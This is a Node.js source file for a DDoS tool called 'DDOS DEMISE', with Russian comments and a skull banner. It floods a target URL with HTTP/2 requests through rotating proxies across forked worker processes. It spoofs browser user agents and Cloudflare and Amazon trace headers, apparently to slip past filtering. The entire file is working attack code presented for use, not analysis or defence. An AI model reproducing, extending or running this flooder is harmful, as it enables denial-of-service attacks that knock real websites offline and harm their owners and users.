const fs = require('fs');
const url = require('url');
const cluster = require('cluster');
const http2 = require('http2');
const tls = require('tls');
const net = require('net');

// 🔠 Встроенный config
const config = {
  banner: true
};

// 💀 ASCII-Баннер с черепом и названием
function banner() {
  console.log(`
       ▄████████    ▄████████    ▄████████    ▄████████
      ███    ███   ███    ███   ███    ███   ███    ███
      ███    ███   ███    █▀    ███    █▀    ███    █▀ 
      ███    ███  ▄███▄▄▄       ███         ▄███▄▄▄    
      ███    ███ ▀▀███▀▀▀     ▀███████████ ▀▀███▀▀▀    
      ███    ███   ███    █▄           ███   ███    █▄ 
      ███    ███   ███    ███    ▄█    ███   ███    ███
       ▀██████▀    ██████████  ▄████████▀    ██████████

                   💀 DDOS DEMISE 💀
`);
}

// 🎯 Аргументы CLI
const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const rps = parseInt(process.argv[4]);
const threads = parseInt(process.argv[5]);
const proxyFile = process.argv[6];

// ❌ Проверка аргументов
if (!target || !duration || !rps || !threads || !proxyFile) {
  console.log('Usage: node ddos_demise_full.js <target> <duration> <rps> <threads> <proxy.txt>');
  process.exit(1);
}

// 🔔 Показать баннер
if (config.banner || process.argv.includes('--debug') || process.env.DEBUG === '1') {
  banner();
}

// 📥 Загрузка прокси
const proxyList = fs.readFileSync(proxyFile, 'utf-8').trim().split('\n');

// 🔧 Генерация HTTP/2 заголовков
function buildHeaders() {
  const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/113.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/112.0.0.0 Safari/537.36'
  ];

  const traceId = Math.random().toString(16).substring(2, 18);
  const cfRay = Math.floor(Math.random() * 1e14).toString(16);

  return {
    ':method': 'GET',
    ':path': '/',
    ':scheme': 'https',
    ':authority': new URL(target).host,
    'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
    'x-amzn-trace-id': `Root=1-${traceId}`,
    'cf-ray': `${cfRay}-LHR`,
    'x-requested-with': 'XMLHttpRequest',
    'origin': 'https://www.google.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'pragma': 'no-cache',
    'cache-control': 'no-cache'
  };
}

// ⚔️ Атака через HTTP/2
function attackHttp2(targetUrl, proxy) {
  const parsed = new URL(targetUrl);
  const [proxyHost, proxyPort] = proxy.split(':');

  const socket = net.connect(proxyPort, proxyHost, () => {
    const tlsSocket = tls.connect({
      socket: socket,
      servername: parsed.hostname,
      rejectUnauthorized: false
    }, () => {
      const client = http2.connect(targetUrl, {
        createConnection: () => tlsSocket
      });

      for (let i = 0; i < rps; i++) {
        try {
          const req = client.request(buildHeaders());
          req.on('response', () => req.close());
          req.end();
        } catch (err) {
          // Ошибку просто игнорируем
        }
      }
    });

    tlsSocket.on('error', () => socket.destroy());
  });

  socket.on('error', () => {});
}

// 🧵 Многопроцессность
if (cluster.isMaster) {
  for (let i = 0; i < threads; i++) {
    cluster.fork();
  }

  setTimeout(() => {
    for (const id in cluster.workers) {
      cluster.workers[id].kill();
    }
    process.exit(0);
  }, duration * 1000);

} else {
  setInterval(() => {
    const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
    attackHttp2(target, proxy);
  }, 1000);
}